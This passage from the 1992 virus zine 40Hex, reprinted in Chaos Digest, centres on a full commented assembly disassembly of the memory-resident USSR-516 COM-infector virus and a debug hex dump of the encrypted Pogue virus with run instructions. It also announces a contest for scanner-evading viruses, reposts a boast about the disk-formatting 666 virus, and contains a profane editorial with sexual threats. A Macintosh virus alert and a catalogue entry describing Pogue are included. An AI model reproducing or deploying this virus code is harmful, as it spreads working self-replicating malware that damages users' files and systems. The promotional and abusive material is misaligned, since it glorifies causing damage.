be extremely similar).  The offsets are in their correct locations, etc, etc.
It is simple to understand and terribly efficient.

Although the coding is tight, there are some inconsistencies.  For
example, I do not understand the purpose of the timing routine(int 21h/ah=30h)
in the code.  I also do not understand why the author decided to infect COM
files in such an abnormal way.  An interesting "feature" is the disabling of
Control-Break checking - a thoroughly unnecessary piece of code.  I believe
further that the line above "findmarker" should read:

                lds     di,dword ptr ds:[30h*4]

In any case, the code is otherwise very, very good.  It is great for studying
by newcomers and "oldtimers" alike.  Things to look for:
  Residency routine
  Lack of extensive use of relative offsets
  Use of stack frame in the interrupt handler
  Critical error handler

Enjoy!                                           Dark Angel of PHALCON/SKISM

ussr516         segment byte public
                assume  cs:ussr516, ds:ussr516
                org     100h
;Disassembled by Dark Angel of PHALCON/SKISM
;for 40Hex Number 7 Volume 2 Issue 3
stub:           db      0e9h, 0, 0
                db      0e9h, 1, 0, 0
;This is where the virus really begins
start:
                push    ax
                call    beginvir

orig4           db      0cdh, 20h, 0, 0
int30store      db      0, 0, 0, 0                     ;Actually it's int 21h
                                                       ;entry point
int21store      db      0, 0, 0, 0

beginvir:       pop     bp                             ;BP -> orig4
                mov     si,bp
                mov     di,103h
                add     di,[di-2]                      ;DI -> orig4
                movsw                                  ;restore original
                movsw                                  ;4 bytes of program
                xor     si,si
                mov     ds,si
                les     di,dword ptr ds:[21h*4]
                mov     [bp+8],di                      ;int21store
                mov     [bp+0Ah],es
                lds     di,dword ptr ds:[30h*4+1]      ;Bug????
findmarker:
                inc     di
                cmp     word ptr [di-2],0E18Ah         ;Find marker bytes
                jne     findmarker                     ;to the entry point
                mov     [bp+4],di                      ;and move to
                mov     [bp+6],ds                      ;int30store
                mov     ax,5252h                       ;Get list of lists
                int     21h                            ;and also ID check

                add     bx,12h                         ;Already installed?
                jz      quitvir                        ;then exit
                push    bx
                mov     ah,30h                         ;Get DOS version
                int     21h

                pop     bx                             ;bx = 12, ptr to 1st
                                                       ;disk buffer
                cmp     al,3
                je      handlebuffer                   ;if DOS 3
                ja      handleDBHCH                    ;if > DOS 3
                inc     bx                             ;DOS 2.X, offset is 13
handlebuffer:
                push    ds
                push    bx
                lds     bx,dword ptr [bx]              ;Get seg:off of buffer
                inc     si
                pop     di
                pop     es                             ;ES:DI->seg:off buff
                mov     ax,[bx]                        ;ptr to next buffer
                cmp     ax,0FFFFh                      ;least recently used?
                jne     handlebuffer                   ;if not, go find it
                cmp     si,3
                jbe     quitvir
                stosw
                stosw
                jmp     short movetobuffer
handleDBHCH:   ;Disk Buffer Hash Chain Head array
                lds     si,dword ptr [bx]              ;ptr to disk buffer
                lodsw                                  ;info
                lodsw                                  ;seg of disk buffer
                                                       ;hash chain head array
                inc     ax                             ;second entry
                mov     ds,ax
                xor     bx,bx
                mov     si,bx
                lodsw                                  ;EMS page, -1 if not
                                                       ;in EMS
                xchg    ax,di                          ;save in di
                lodsw                                  ;ptr to least recently
                                                       ;used buffer
                mov     [di+2],ax                      ;change disk buffer
                                                       ;backward offset to
                                                       ;least recently used
                xchg    ax,di                          ;restore EMS page
                mov     [di],ax                        ;set to least recently
movetobuffer:                                          ;used
                mov     di,bx
                push    ds
                pop     es                             ;ES:DI -> disk buffer
                push    cs
                pop     ds
                mov     cx,108h
                lea     si,[bp-4]                      ;Copy from start
                rep     movsw
                mov     ds,cx                          ;DS -> interrupt table
                mov     word ptr ds:[4*21h],0BCh       ;New interrupt handler
                mov     word ptr ds:[4*21h+2],es       ;at int21
quitvir:
                push    cs                             ;CS = DS = ES
                pop     es
                push    es
                pop     ds
                pop     ax
                mov     bx,ax
                mov     si, 100h                       ;set up stack for
                push    si                             ;the return to the
                retn                                   ;original program
int24:
                mov     al,3                           ;Ignore all errors
                iret
tickstore       db      3                              ;Why???
buffer          db      3, 0, 9, 0

int21:
                pushf
                cli                                    ;CP/M style call entry
                call    dword ptr cs:[int30store-start]
                retn                                   ;point of int 21h

int21DSDX:                                             ;For int 21h calls
                push    ds                             ;with
                lds     dx,dword ptr [bp+2]            ;DS:DX -> filename
                call    int21
                pop     ds
                retn

                cmp     ax,4B00h                       ;Execute
                je      Execute
                cmp     ax,5252h                       ;ID check
                je      CheckID
                cmp     ah,30h                         ;DOS Version
                je      DosVersion
callorig21:                                            ;Do other calls
                jmp     dword ptr cs:[int21store-start]
DosVersion:     ;Why?????                              ;DOS Version
                dec     byte ptr cs:[tickstore-start]
                jnz     callorig21                     ;Continue if not 0
                push    es
                xor     ax,ax
                push    ax
                mov     es,ax
                mov     al,es:[46Ch]                   ; 40h:6Ch = Timer ticks
                                                       ; since midnight
                and     al,7                           ; MOD 15
                inc     ax
                inc     ax
                mov     cs:[tickstore-start],al        ;# 2-17
                pop     ax
                pop     es
                iret
CheckID:                                               ;ID Check
                mov     bx,0FFEEh                      ;FFEEh = -12h
                iret
Execute:                                               ;Execute
                push    ax                             ;Save registers
                push    cx
                push    es
                push    bx
                push    ds                             ;DS:DX -> filename
                push    dx                             ;save it on stack
                push    bp
                mov     bp,sp                          ;Set up stack frame
                sub     sp,0Ah                         ;Temporary variables
                                                       ;[bp-A] = attributes
                                                       ;[bp-8] = int 24 off
                                                       ;[bp-6] = int 24 seg
                                                       ;[bp-4] = file time
                                                       ;[bp-2] = file date
                sti
                push    cs
                pop     ds
                mov     ax,3301h                       ;Turn off ^C check
                xor     dl,dl                          ;(never turn it back
                call    int21                          ; on.  Bug???)
                mov     ax,3524h                       ;Get int 24h
                call    int21                          ;(Critical error)
                mov     [bp-8],bx
                mov     [bp-6],es
                mov     dx,int24-start
                mov     ax,2524h                       ;Set to new one
                call    int21
                mov     ax,4300h                       ;Get attributes
                call    int21DSDX
                jnc     continue
doneinfect:
                mov     ax,2524h                       ;Restore crit error
                lds     dx,dword ptr [bp-8]            ;handler
                call    int21
                cli
                mov     sp,bp
                pop     bp
                pop     dx
                pop     ds
                pop     bx
                pop     es
                pop     cx
                pop     ax
                jmp     short callorig21               ;Call orig handler
continue:
                mov     [bp-0Ah],cx                    ;Save attributes
                test    cl,1                           ;Check if r/o????
                jz      noclearattr
                xor     cx,cx
                mov     ax,4301h                       ;Clear attributes
                call    int21DSDX                      ;Filename in DS:DX
                jc      doneinfect                     ;Quit on error
noclearattr:
                mov     ax,3D02h                       ;Open read/write
                call    int21DSDX                      ;Filename in DS:DX
                jc      doneinfect                     ;Exit if error
                mov     bx,ax
                mov     ax,5700h                       ;Save time/date
                call    int21
                mov     [bp-4],cx
                mov     [bp-2],dx
                mov     dx,buffer-start
                mov     cx,4
                mov     ah,3Fh                         ;Read 4 bytes to
                call    int21                          ;buffer
                jc      quitinf
                cmp     byte ptr ds:[buffer-start],0E9h;Must start with 0E9h
                jne     quitinf                        ;Otherwise, quit
                mov     dx,word ptr ds:[buffer+1-start];dx = jmploc
                dec     dx
                xor     cx,cx
                mov     ax,4201h                       ;go there
                call    int21
                mov     ds:[buffer-start],ax           ;new location offset
                mov     dx,orig4-start
                mov     cx,4
                mov     ah,3Fh                         ;Read 4 bytes there
                call    int21
                mov     dx,ds:[orig4-start]
                cmp     dl,0E9h                        ;0E9h means we might
                jne     infect                         ;already be there
                mov     ax,ds:[orig4+2-start]          ;continue checking
                add     al,dh                          ;to see if we really
                sub     al,ah                          ;are there.
                jz      quitinf
infect:
                xor     cx,cx
                mov     dx,cx
                mov     ax,4202h                       ;Go to EOF
                call    int21
                mov     ds:[buffer+2-start],ax         ;save filesize
                mov     cx,204h
                mov     ah,40h                         ;Write virus
                call    int21
                jc      quitinf                        ;Exit if error
                sub     cx,ax
                jnz     quitinf
                mov     dx,ds:[buffer-start]
                mov     ax,ds:[buffer+2-start]
                sub     ax,dx
                sub     ax,3                           ;AX->jmp offset
                mov     word ptr ds:[buffer+1-start],ax;Set up buffer
                mov     byte ptr ds:[buffer-start],0E9h;code the jmp
                add     al,ah
                mov     byte ptr ds:[buffer+3-start],al
                mov     ax,4200h                       ;Rewind to jmploc
                call    int21
                mov     dx, buffer-start
                mov     cx,4                           ;Write in the jmp
                mov     ah,40h
                call    int21
quitinf:
                mov     cx,[bp-4]
                mov     dx,[bp-2]
                mov     ax,5701h                       ;Restore date/time
                call    int21
                mov     ah,3Eh                         ;Close file
                call    int21
                mov     cx,[bp-0Ah]                    ;Restore attributes
                mov     ax,4301h
                call    int21DSDX
                jmp     doneinfect                     ;Return
ussr516         ends
                end     stub

+++++

40Hex Number 7 Volume 2 Issue 3                                     File 007

Just a friendly reminder:

                        ------------------------
                             Virus Contest!
                           'The Spammies(tm)'
                        ------------------------
                        Deadline: July 4th, 1992


   This is the first PHALCON/SKISM virus contest.  As a matter of fact, this
is the first contest of its kind.  We believe that it will motivate you to
produce more original code, rather than more hacks.  Winners may have already
won $10,000,000, as well as the prestige of winning the first ever 'Spammie'
awards.


Rules and Regulations:
1)  All submissions must be original source code. (no hacks)
2)  Only one submission is allowed per programmer, plus one group project.
3)  All viruses must be recieved by us before July 4th, 1992.
4)  Viruses must be accompanied by a complete entry form. (see below)
5)  The original, compilable, commented source MUST be included, along with an
    installer program, or a dropper, in the case of boot block viruses.
6)  Entries must include a location where the author may be contacted, such as
    an email address or a BBS.
7)  Personnel or persons related to personnel of PHALCON/SKISM are not
    eligable.
8)  The source must compile without error under Tasm or Masm (please specify
    what assembler and version you used, along with the necessary command line
    switches).  If we cannot compile your virus, it will be disqualified.
9)  All entries recieve a free subscription to 40hex.  (hehehehe)
10) The entry must be uploaded privately to the sysop, stating that it is a
    contest entry.
11) The viruses must not be detectable by the current version (as of July 4th)
    of any known virus scanner.
12) Viruses will be judged by our 'panel of experts' in three catagories.
    6.1)  Stealth
    6.2)  Size
    6.3)  Reproductivity
    6.4)  Performance
        For example, Red Cross is an example of a 'high performance' virus.
        It was entertaining and well done.

*** Entry Form

Handle ________________________
Group Afiliation ______________
Virus Name ____________________
Size ____bytes (if you need more spaces, go away)
Type               ___ File Infector ___ Boot block
Infection method   ___ Direct Action ___ Memory Resident   ___ Directory chain
                   ___ Other (please describe it in detail)
Encryption routine ___ None (bah)    ___ Xor loop
                   ___ Other (please describe it in detail)

Describe what makes your infection routine unique.
______________________________________________________________________________
_
______________________________________________________________________________
_
Describe what makes your encryption routine unique.
______________________________________________________________________________
_
______________________________________________________________________________
_
Describe what means your virus uses, other than encryption, to keep itself
hidden.
______________________________________________________________________________
_
______________________________________________________________________________
_
What is the largest possible scan string for this virus?  __bytes

What else sets this virus apart from other viruses?
______________________________________________________________________________
_
______________________________________________________________________________
_
______________________________________________________________________________
_

+++++

40Hex Number 7 Volume 2 Issue 3                                       File 008


More Virus News.  An informed virus Programmer is a good one.

Article 1:   New Macintosh Virus
Article 2:   RockSteady's 666 Virus [NuKE]
Article 3:   A Stooge's View


<<<<<<<<<
Article 1
<<<<<<<<<

Date:    Fri, 17 Apr 92 11:34:50 -0500
>From:    Gene Spafford 
Subject: Mac announcement - new virus (Mac)

                    New Macintosh Virus Discovered
                            17 April 1992

Virus: CODE 252
Damage: some, possibly severe (see text)
Spread: unknown (see text)
Systems affected: Apple Macintosh computers. All types, but see text.

A new virus, which has been designated "CODE 252", has been discovered
on Apple Macintosh computer systems. This virus is designed to trigger
if an infected application is run or system booted between June 6 and
December 31, inclusive.  When triggered, the virus brings up a dialog
box with the message:
   You have a virus.
   Ha Ha Ha Ha Ha Ha Ha
   Now erasing all disks...
   Ha Ha Ha Ha Ha Ha Ha
   P.S. Have a nice day.
   Ha Ha Ha Ha Ha Ha Ha
   (Click to continue...)

Despite this message, no files or directories are deleted in the
versions of the virus we have seen; however, a worried user might
power down the system upon seeing the message, and thus corrupt the
disk -- this could lead to significant damage.  Furthermore, the virus
may interact with some applications in such a manner as to damage them.

Under System 7, the System file can be seriously damaged by the virus
under at least some circumstances as the virus attempts to spread.
This may lead to a system that will not boot, crashes, or other
unusual behavior.

Between January 1 and June 5, inclusive, the virus simply spreads from
applications to system files, and then on to other application files.
At the present moment, we have no indication that the virus causes
direct damage to any existing applications.

The virus does not spread to other applications under MultiFinder on
System 6.x systems, nor will it spread under System 7.  However, it
will run on those systems if an infected application is executed.
Even if you are running one of these systems, we recommend you obtain
an use one of latest versions of appropriate anti-virus software.

As of the date of this announcement (17 April 92), we have had limited
reported sightings of this virus.  This, combined with the nature of
operation of the virus, leads us to believe that the virus is not yet
widespread.

The current versions of Gatekeeper and SAM Intercept (in advanced and
custom mode) are effective against this virus.  Either program should
generate an alert if the virus is present and attempts to spread to
other files.  The Virex Record/Scan feature will also detect the virus.

Authors of all major Macintosh anti-virus tools are planning updates
to their tools to locate and/or eliminate this virus. Some of these
are listed below. We recommend that you obtain and run a CURRENT
version of AT LEAST ONE of these programs.

Some specific information on updated Mac anti-virus products follows:

Tool: Disinfectant
Status: Free software (courtesy of Northwestern University and
John Norstad)
Revision to be released: 2.8
Where to find: usual archive sites and bulletin boards --
               ftp.acns.nwu.edu, sumex-aim.stanford.edu,
               rascal.ics.utexas.edu, AppleLink, America Online,
               CompuServe, Genie, Calvacom, MacNet, Delphi,
               comp.binaries.mac
When available: soon


Tool: Gatekeeper
Status: Free software (courtesy of Chris Johnson)
Revision to be released: 1.2.6 (probably)
Where to find: usual archive sites and bulletin boards --
               microlib.cc.utexas.edu, sumex-aim.stanford.edu,
               rascal.ics.utexas.edu, comp.binaries.mac
When available: eventually
Comments:
Gatekeeper should find this virus if it attempts to infect your
system or applications, and thus does not need an update.
Gatekeeper Aid will need an update to "know" exactly what virus it
is seeing so it can remove the virus, but the update is not
crucial for continued protection.  As Gatekeeper is freeware and
Chris has a "real" life, this update may not be immediate.


Tool: Rival
Status: Commercial software
Revision to be released: Rival 1.1.9v (CODE 252 Vaccine or Refresh 1.1.9v)
Where to find it: AppleLink, America Online, Internet, Compuserve.
When available: Immediately.


Tool: SAM (Virus Clinic and Intercept)
Status: Commercial software
Revision to be released: 3.0.8
Where to find: CompuServe, America Online, Applelink, Symantec's
               Bulletin Board @ 408-973-9598
When available: 17 April 1992.  Version 3.0.8 of the Virus
                Definitions file are also available.


Tool: Virex INIT
Status: Commercial software
Revision to be released: 3.8
Where to find: Microcom, Inc (919) 490-1277
When available: Immediately.
Comments:
Virex 3.8 will detect and repair the virus. All
Virex subscribers will automatically be sent an update on
diskette. All other registered users will receive a notice with
information to update prior versions to be able to detect
CODE 252. This information is also available on Microcom's BBS.
(919)419-1602, and is presented here:
          Guide Number = 6324448
          1: 0203 3001 7778 2A00 / 79
          2: 0C50 4EFA 0003 A9AB / C4
          3: 0004 A9AA 0002 A647 / B2
          4: 8180 9090 9090 9090 / 1B

Tool: Virus Detective
Status: Shareware
  Revision to be released: 5.0.4
Where to find: Usual bulletin boards will announce a new search string.
               Registered users will also get a mailing
               with the new search string.
When available: Immediately.
Comments: search strings are:
Resource Start & Size < 1200 & WData 2F2C#23F3C#2A9A0*3F3C#24878#2A9AB;
For find CODE 252 in Appl's
Filetype=ZSYS & Resource INIT & Size < 1200 & WData 2F2C#
3F3C#2A9A0*3F3C#24878
#2A9AB; For find CODE 252 in System


If you discover what you believe to be a virus on your Macintosh
system, please report it to the vendor/author of your anti-virus
software package for analysis.  Such reports make early, informed
warnings like this one possible for the rest of the Mac community.

------------------------------

End of Chaos Digest #1.62
************************************

Chaos Digest              Vendredi 25 Juin 1993        Volume 1 : Numero 63
                             ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.63 (25 Juin 1993)
File 1--40H VMag Number 7 Volume 2 Issue 3 #008(2)-009 (reprint)
File 2--Consequences du virus TREMOR (communique)
File 3--"Computer Security Basics" de Deborath Russell (critique)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * cs.ubc.ca [137.82.8.5] in /mirror3/EFF/cud/chaos
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Number 7 Volume 2 Issue 3 #008(1)-009 (reprint)



<<<<<<<<<<
Article 2:
<<<<<<<<<<

==========================================================================
Date: 04-27-92 (04:18)              Number: 264 of 275 (Echo)
To: ALL                             Refer#: NONE
From: STEVENS WALLACE               Read: (N/A)
Subj: 666 IS GONNA GET YEAH         Status: PUBLIC MESSAGE
Conf: N_VIRUS (41) Read Type: GENERAL (A) (+)

                   Rock Steady `666' Virus            Released: Mar 24'92
[Montreal,Canada] PROGRAMMED:By Rock Steady. A few patches from other neat
Viruses
DAMAGE:The Virus will format the HD BOOT & FAT area on the 13th of
every Month! I wrote TWO formating procedures. One with the INT 13h and one
with the INT 26h! To make 100% the suckers HD gets trashes for GOOD!
NOTES:This is a Simple EXE & COM Infector! It infects ALL Files Executed  The
Virus Hides in High Memory! And Hooks Int 21h! It will increase  files by the
length of 666 Bytes! but if the Virus is Resident in  Memory the Length of
the Files on a "DIR" will remain the SAME under  MSDOS V3.30 - 5.0!
OTHER:*uck the Name. Its the ONLY text in the Virus! So the Anti-Virus
people will call it `Rock Steady', since the virus needs that signature  to
check if the file is infected on infection routines & DIR routine!
PURPOSE:To make a very small "Stealth" Virus. And create a HOLE shit  load of
damage for people not to forget!
ANTI-VIRAL:*uck Them! I've tried with SCANV89B, F-PROT2.03A, VirexPC  Central
Point 1.2, Nortan Scanner, ViruScan And it's UNDETECTABLE!

Neat heh? McGill Univ. is flipping over this new Virus that they just got hit
with in Montreal. *uck it's hot...

aLl comments to moi...
=======================================================================


<<<<<<<<<<
Article 3:
<<<<<<<<<<

Extracted from "Gui Guts" by Yacco, in ComputerCraft Magazine, June 1992
------------------------------------------------------------------------

Mutant Ninja Morons
-------------------
Did you survive the Michaelangelo Virus? That's what everybody,
including Bill, the guy from UPS, has been asking me. I spent most of
last night organizing and archiving several year's worth of data. I
suppose I should be grateful to the fan of comic culture who wrote this
virus for the motivation to do something I've been putting off for a
long time. But these virus writers aren't exactly virtuous. I wouldn't
be sitting here now creating files with tomorrow's date on them if they
were. In fact, it occurs to me that what motivates them is a need to
control and terrorize people. In other words, they're a new breed of
rapist: the mass rapist. And just like physical rape isn't about sex,
electronic rape isn't about intellectual challenges.

[I wasn't going to comment until I got this classic article.  This is so
funny.  This guy thinks Michelangelo was named after the Teenage Mutant
Ninja Turtle.  And hell, *IF* we are rapists, Yacco, better bend over
and spread em wide, cause we are gonna fuck you hard.  What kinda name
is Yacco???  Fuck him.  Why is everyone so curious as to what motivates
us?  Can't it be that we just simply enjoy it?  Must it be social
problems, or publicity?  Don't blame the virus community for the
Michelangelo scare, blame the Anti Virus Community.  It was a scare, a
simple ploy to gain money!  I had everyone asking me how do I protect
myself?  So, I spent a couple days helping out people who weren't
infected.  Everywhere I went, Michelangelo!  How many infections did I
find? 1.  One fucking infection.  I think everyone in the Anti-Virus
Community benefitted.  Do you think that the author of Michelangelo made
a press release about the virus?  I don't recall that.  So, there goes
the publicity theory.  He didn't control anyone.  Anti-Virus people did.
A scare tactic.  Plain and simple.  The End.]


PS: Saw a useful article in the latest issue of a magazine?  Anything
Virus related?  Well, ya don't have to type it in!  Just contact a
-=PHALCON/SKISM=- Member, and we will take care of it.  Leave him mail
stating what magazine, what issue, and what page, and your handle (We
will throw ya into our Greet list).

                                        ->GHeap!
+++++

40Hex Number 7 Volume 2 Issue 3                                      File 009

                 Pogue Mahone!

The following is what Patti Hoffman has to say about the Pogue virus.

----------------------------- VSUMX 9204 ------------------------------------

Virus Name:  Pogue
Aliases:
Scan ID:     [Pogue] & [7S] & [DAME] & [512] (memory)
V Status:    New
Discovered:  January, 1992
Symptoms:    .COM file growth; decrease in total system & available free
             memory; music
Origin:      Bulgaria
Eff Length:  2,973 - 3,850 Bytes
Type Code:   PRhC - Parasitic Resident .COM Infector
Detection Method:  ViruScan V86B+, Novi 1.1+
Removal Instructions:  Delete infected files

General Comments:

The Pogue virus was submitted in January, 1992.  It is originally
from bulgaria.  Pogue is a memory resident infector of .COM
programs, but not those that have a base file name which starts
with the three characters "COM".  Pogue contains portions of
code from four other viruses:  512, Dark Avenger, Seventh Son, and
Yankee Doodle.  It employs a complex encryption mechanism, and
detection of infected files will require an algorithmic approach.
It does occassionally infect a file with an inencrypted copy of
itself, and as a result may appear to the user as an infection of
one of the four viruses on which it is based.

The first time a program infected with the Pogue virus is executed,
the Pogue virus will install itself memory resident at the top of
system memory but below the 640k DOS boundary.  Total system and
available free memory, as indicated by the DOS CHKDSK program, will
have decreased by 9,728 bytes.  Interrupt 12's return will not have
been moved.  Interrupts 1C and 21 will be hooked by the virus.

Once the Pogue virus is memory resident, it will infect .COM
programs when they are opened, executed, or copied.  In the case of
copying, both the source and the target file will infected.  The
exception is that Pogue will not infect a .COM file if the base file
name starts with the three characters "COM".  This is the mechanism
used by the virus to avoid infecting COMMAND.COM.

Pogue infected programs will have a file length increase of 2,973 to
3,850 bytes.  The virus will be located at the end of the infected
program.  The file's date and time in the DOS disk directory listing
will not have been altered by the viral infection process.

Usually the Pogue virus will encrypt itself using its garbling
encryption mechanism on infected files.  In these files, no text
strings will be visible within the viral code.  Occassionally, this
virus will infect a file with an unencrypted copy of the viral
code.  In these cases, the following text strings will be visible:

        "Pogue Mahone!"     - or -     "Pgoue Mahone!"
        "TNX2DAV"

The unencrypted infections of Pogue on files as well the Pogue virus
in system memory may be detected by anti-viral scanners as any of the
four viruses on which Pogue is based.

The Pogue virus will play music on the system speaker when it becomes
memory resident and the system time is between 08:00 and 09:00.

----------------------------- VSUMX 9204 -------------------------------------

To decrypt, simply fire up debug and type
  g 13D

------------------------------------------------------------------------------
n pogue.com
e 0100  4D E9 04 00 00 00 00 00 BD 6C A1 B1 03 D3 CD 8B
e 0110  CD BD 6E 85 81 CD 0F 74 8B F5 BD 92 3B 03 EE 33
e 0120  E9 81 ED 0C B1 8B 9E 23 0D 81 C3 64 9D 87 9E 23
e 0130  0D BB 31 8F 2B DD BD 33 8F 2B EB 75 E8 8B DD B1
e 0140  03 D3 CB 84 63 9C C0 5B 63 9D B9 1F 51 9F B8 F3
e 0150  E3 62 28 A8 8D 93 5F 41 08 FB C0 54 3D 76 30 BD
e 0160  E2 98 08 10 CB 54 63 CC 2F BD 9E 9F D4 FB 80 A2
e 0170  EE 74 AB 2A 3B 1C A1 9C 62 F6 D7 EB 03 9F 62 C9
e 0180  C2 9E D4 E3 05 9F 62 1D 91 AE 62 FC 64 2A 69 AE
e 0190  62 AA 81 55 2C A7 F2 8F 07 2A 3C 5A E7 9C ED 9A
e 01A0  08 41 21 0C 63 27 61 41 08 A2 81 56 37 9D 1A BD
e 01B0  87 69 84 56 70 9E 1A B8 87 62 69 AC 6E 9C F2 69
e 01C0  84 CA 29 A2 2C A8 62 9C 4A A6 62 A3 81 5F B7 EA
e 01D0  BA CE A6 DD B8 62 69 AD 6E 9C F2 63 69 AE 6E B2
e 01E0  6E 63 69 B0 6E 08 6F 50 8D 69 84 1C 61 A1 D7 B4
e 01F0  E2 96 64 11 76 63 69 AE 6E 32 6F 63 69 B0 6E 52
e 0200  6F 62 69 AC 6E 9D F2 5F 17 C8 2F BD 60 69 E3 99
e 0210  6A 12 51 5F 13 9F 31 38 A0 76 3D 10 91 EE B3 EF
e 0220  B2 F2 B9 BA 68 1C 5F DA D7 A0 16 E1 4D A3 9F 9C
e 0230  AD 11 6D 50 A0 69 84 0E 67 2F 4B 0C 63 A3 81 FB
e 0240  C0 F4 BD F5 BC 39 91 9B 91 20 63 54 76 41 00 6B
e 0250  FF BA B5 EC 70 BB E2 DA 72 A8 63 11 AA 1C A1 AD
e 0260  6E 9C D6 A2 60 AA 73 A8 4D D6 ED BA 74 A8 46 FD
e 0270  86 98 49 FD E5 DB 61 11 6A 62 69 AC 6E 9E 4D C0
e 0280  12 52 49 DF ED A3 48 DE E8 60 49 DE 46 FD 6E 9F
e 0290  48 FD E5 A2 74 A8 64 27 81 B0 6E 26 6A 3E 74 A8
e 02A0  61 A2 76 A8 BA F7 81 39 91 9B 91 0C 63 98 1B 9C
e 02B0  95 69 84 EE FB DC B2 69 84 23 36 54 87 D1 2F BD
e 02C0  B5 A2 E9 76 71 BB 1C 6D 64 50 88 EC 2F BD 1A BC
e 02D0  74 EF 2F CB 88 26 80 54 79 AE 2F CB BD A2 81 9B
e 02E0  D8 9E 61 11 67 1D E0 C4 A5 EB D7 17 E3 19 8D E9
e 02F0  D7 11 E4 19 83 DF B1 10 D1 1C E0 AE 52 0F CB 62
e 0300  A8 9E 64 CF 22 BC A7 A0 E9 E1 77 EC 70 BB 1B A0
e 0310  62 5A 28 A8 ED 72 17 DB 2F BD E2 D8 AF 10 A2 1C
e 0320  9F F6 D6 D6 88 27 A8 AD 88 25 A8 B1 B2 F2 B9 F1
e 0330  80 A2 B5 84 AF 9C BD 50 A3 69 84 D7 2A A3 81 F9
e 0340  C1 FA BA 11 7C 63 67 E9 4B C9 66 9C EB E0 64 CF
e 0350  22 C2 EB E1 77 55 67 9C ED 72 17 DC 2F BD 68 BB
e 0360  F1 E1 77 1C B0 A2 A2 50 A1 38 71 84 3B 9A E3 E9
e 0370  67 DC F1 E1 66 2B A8 9E BA BB BC 69 84 F4 BC 69
e 0380  84 5F 5D 28 36 25 81 98 63 27 3F 25 81 9A 63 56
e 0390  63 9D 65 5E F8 28 2B 2A 33 A1 52 9C F0 5C 1F 9C
e 03A0  71 97 1C 65 6E 2C 96 9B 96 92 16 AB 1A 9D 6B 84
e 03B0  D9 9C 5C CA 03 98 63 2A 33 CA 03 9A 63 27 43 97
e 03C0  26 EC D1 03 D8 01 83 E9 C3 04 D2 0A C8 BD 62 80
e 03D0  A3 26 43 80 A3 DC 4D BD B3 EF 90 26 81 66 6F CE
e 03E0  61 CA ED 23 2F A8 4A CB 62 55 68 9C 33 7C ED 74
e 03F0  95 78 DC 9D A2 7E 58 F7 BB EF 90 26 81 67 6F CE
e 0400  61 CA EB 23 2F A8 E2 5F 65 CA EA BA 2D A8 E8 60
e 0410  91 D6 80 66 6F F7 D7 A2 90 1C 69 66 6F 9E 25 E9
e 0420  D6 E1 82 CC 90 D5 92 7D 5F BA B4 F1 4A C2 62 27
e 0430  3D 31 BD FA BF C7 41 EF B9 ED 4A 5A 63 F5 C0 5B
e 0440  BC A1 8D 95 BA EE 55 40 BC F6 C0 C7 2C C7 5C 3D
e 0450  99 9D 59 74 26 A2 81 1F 24 B2 59 75 E3 7D 61 11
e 0460  65 E5 AB 33 06 CE 63 9F 23 C0 60 11 65 E4 AA EC
e 0470  F9 5B 97 9D 0D 2D 0E 31 0E 32 0E 4D 83 6E 44 1C
e 0480  54 BC EA E9 55 F9 B7 EF 4A E0 61 5B 9F 9D 1B A4
e 0490  62 4C 62 8F 0D 5B BC 9D 15 A3 4A B5 62 EB E3 9B
e 04A0  BC 9D D6 AA B4 F3 B7 54 64 9C 4A 4C 63 FB F7 47
e 04B0  C2 F6 BD F4 95 89 B3 EF B4 F3 95 5C 22 FF 62 27
e 04C0  32 8F 0E 4C 67 22 A8 A8 B2 27 B8 A9 21 F5 65 F1
e 04D0  4A 65 65 F9 4A E6 64 F4 C1 F6 04 D1 63 C0 63 C4
e 04E0  68 CB 63 EC 4A 5C 65 F4 62 E0 45 2F BE C9 B2 9D
e 04F0  D4 2F D8 A1 9B E0 50 11 EF F7 25 9F 2C 27 3A 33
e 0500  04 CE 63 21 23 11 66 5B BC A1 1D F5 63 ED B2 D7
e 0510  3C 10 72 E7 EC A3 96 9D 9E FD D6 9E 96 A5 0C DD
e 0520  4D 89 BD F4 1D EC 63 21 35 10 6E 2D 13 85 0D 27
e 0530  42 2E 0E 5B BC A1 58 A2 97 9D 6A 11 6C 93 3C 1F
e 0540  44 AB 12 2C 56 46 F0 21 0A 96 64 A3 86 9A 64 A2
e 0550  98 9D 4A 96 61 2A 40 6D 4B 27 2B 8F 08 F3 B2 CF
e 0560  2B 2A 3C 28 2C 57 E2 A1 21 A8 62 96 EA E9 64 23
e 0570  80 97 B4 EF B9 BA 68 BB 70 57 BC 9F 4A DA 62 31
e 0580  6A FB 5C F4 0D F4 0D 97 BE BA 69 5B C6 9C 95 92
